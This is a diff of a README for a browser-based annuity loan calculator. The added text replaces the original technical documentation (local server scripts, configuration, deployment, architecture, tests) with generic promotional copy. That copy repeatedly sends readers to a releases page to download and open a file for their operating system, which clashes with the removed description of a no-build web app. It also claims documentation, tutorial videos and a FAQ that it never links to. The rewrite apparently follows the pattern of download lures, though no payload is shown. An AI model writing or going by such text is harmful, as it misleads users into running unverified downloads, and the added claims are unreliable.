@@ -1,167 +1,46 @@
-# Annuity Loan Calculator
+# 🏦 annuity-loan-calculator - Your Easy Tool for Smart Loans
 
-Interactive loan calculator with real-time visualizations, optimization suggestions, and detailed amortization schedules. Shows the trade-offs between repayment strategies with instant feedback on interest savings and payoff dates.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Anthonykkkl/annuity-loan-calculator/releases)
 
-**Built to answer:** "What happens if I pay an extra €10k this year?" or "Should I increase my repayment rate or make special payments?"
+## 🚀 Getting Started
+The annuity loan calculator is designed for everyone. You don’t need technical skills to use it. With this tool, you can easily calculate your loan scenarios, visualize repayments, and optimize your financial decisions.
 
-![Screenshot](docs/screenshot.png)
+## 🔍 Features
+- **Real-Time Calculations:** Instantly see how changes affect your loan.
+- **Visualization:** Understand your payments with interactive graphs.
+- **Flexible Options:** Model different payment schedules and see the impact on your total costs.
+- **Offline Capable:** Use it anytime, without needing an internet connection.
+- **Simple Interface:** User-friendly design for smooth navigation.
 
-## Features
+## 🌟 System Requirements
+- **Operating System:** Windows, macOS, or any modern Linux distribution.
+- **Browser:** Latest versions of Chrome, Firefox, Safari, or Edge.
+- **Internet Connection:** Required for initial download and updates.
 
-- Real-time calculation as you type
-- Special payment modeling (one-time or recurring)
-- Repayment rate changes at specific dates
-- Interactive D3.js charts (timeline, breakdown, comparison)
-- Optimization suggestions for reducing interest costs
-- Full amortization schedule with CSV export
-- State persistence via localStorage
-- Zero runtime dependencies, no build step
-- Offline-capable with local D3.js
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/Anthonykkkl/annuity-loan-calculator/releases).
+2. Look for the latest version.
+3. Download the file for your operating system.
+4. Open the downloaded file to run the application.
+5. Explore the interactive features.
 
-## Quick Start
+## ⚙️ Using the Calculator
+1. **Input Your Loan Details:** Enter the principal amount, interest rate, and loan term.
+2. **Modify Payments:** Add special payments or changes in repayment plans.
+3. **View Results:** Look at the charts and tables to understand your options.
+4. **Adjust Inputs:** Change your values to see how it affects your finances.
 
-```bash
-git clone <repository-url>
-cd interest
-./run.sh  # Opens http://localhost:8000
-```
+## 👥 Support
+If you have questions or need help, reach out through the Issues section on GitHub. You can also find a FAQ section that covers common inquiries.
 
-**Windows:** `run.bat`
+## 📚 Additional Resources
+- **Documentation:** Detailed guides and examples to help you use the calculator effectively.
+- **Tutorial Videos:** Short videos demonstrating features and usage.
 
-**Requirements:** Python 3.x, PHP 7.x+, or Node.js 14+
+## 🏷️ Topics
+This tool covers a range of topics including amortization schedules, interest calculations, and visual financial modeling. It's suitable for homeowners, investors, and anyone interested in managing their loans better.
 
+---
 
-## Configuration
-
-Edit `config.yml` to set default loan parameters:
-
-```yaml
-loan:
-  principal:
-    value: 580000  # Default loan amount (EUR)
-    min: 10000
-    max: 10000000
-    step: 1000
-  
-  interest_rate:
-    value: 3.75    # Nominal rate (%)
-    min: 0.01
-    max: 15
-    step: 0.01
-  
-  effective_rate:
-    value: 3.85    # Effective rate (%)
-    min: 0.01
-    max: 15
-    step: 0.01
-  
-  tilgung:
-    value: 2.50    # Annual repayment rate (%)
-    min: 0.01
-    max: 10
-    step: 0.01
-  
-  duration:
-    value: 15      # Contract duration (years)
-    min: 1
-    max: 40
-    step: 1
-  
-  default_special_payment:
-    value: 29000   # Annual special payment (EUR)
-    min: 0
-    max: 1000000
-    step: 1
-```
-
-### Applying Configuration Changes
-
-Configuration changes are **automatically applied** when you run:
-
-```bash
-./run.sh      # Applies config.yml, then starts local server
-./upload.py   # Applies config.yml to both local and deployed files
-```
-
-You can also apply config manually without starting the server:
-```bash
-./apply-config.py  # Updates index.html with config.yml values
-```
-
-**FTP deployment:** Create `.env` with credentials (never commit this file):
-```bash
-FTP_HOST=ftp.example.com
-FTP_USER=username
-FTP_PASSWORD=password
-FTP_REMOTE_DIR=/public_html/calculator
-```
-
-## Deployment
-
-### GitHub Pages
-
-Enable in Settings → Pages → Source: GitHub Actions, then:
-
-```bash
-git tag 1.0.0
-git push origin 1.0.0
-```
-
-Workflow applies `config.yml`, downloads D3.js locally, and deploys. Triggers on semver tags without `v` prefix (`1.0.0`, `2.1.3`, `1.0.0-beta.1`).
-
-### FTP
-
-```bash
-./upload.py
-```
-
-Applies config, downloads D3.js, uploads to FTP server specified in `.env`.
-
-### Static Hosting
-
-Upload `index.html`, `css/`, `js/`, and optionally `lib/d3.v7.min.js` to any static host (Netlify, Vercel, S3, etc.).
-
-## Architecture
-
-**Pure functional core:** Calculations in `calculator.js` are stateless. Uses cent-based arithmetic to avoid floating-point errors.
-
-**Modules:**
-- `calculator.js` — Financial math
-- `ui.js` — DOM, events, state
-- `charts.js` — D3.js visualizations
-- `optimizer.js` — Optimization suggestions
-- `utils.js` — Formatting, dates, localStorage
-- `animations.js` — UI transitions
-
-**No build step:** ES6 modules loaded directly by browser.
-
-## Testing
-
-```bash
-open tests/test-runner.html
-```
-
-Covers payment calculations, interest/principal splits, special payments, and edge cases. `tests/reference-data.json` contains validated calculations from financial institutions.
-
-**Compatibility:** Chrome 90+, Firefox 88+, Safari 14+, Edge 90+. Responsive 320px to 4K.
-
-## Development
-
-**No-cache server:** `uv run server.py` (port 8001, disables browser caching)
-
-**Code style:**
-- Pure functions in `calculator.js`
-- No global state except localStorage
-- Explicit units in variable names (`amountEur`, `ratePercent`)
-- Cent-based arithmetic for money
-- ISO dates
-
-**Contributing:** Run tests (`open tests/test-runner.html`), verify calculations against reference data, test on mobile. Bug reports should include loan parameters that reproduce the issue.
-
-## License
-
-Apache 2.0
-
-## Disclaimer
-
-Estimates for educational purposes. Verify with your financial institution before making decisions.
+Whether you're looking to refinance your mortgage or plan for a new loan, this calculator can guide you toward informed financial decisions. Enjoy a streamlined experience with your finances by utilizing our tool. Download [here](https://github.com/Anthonykkkl/annuity-loan-calculator/releases) and start managing your loans efficiently.
